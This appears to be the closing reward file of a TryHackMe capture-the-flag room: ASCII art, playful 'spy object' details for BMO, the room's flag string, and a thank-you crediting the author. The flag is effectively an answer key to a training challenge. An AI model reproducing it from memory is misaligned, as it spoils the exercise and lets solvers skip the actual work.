░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

Secret project number: 211243A
Name opbject: BMO
Rol object: Spy

In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}

-------

Good job on getting this code!!!!
You solved all the puzzles and tried harder to the max.
If you liked this CTF, give a shout out to @n0w4n.
```
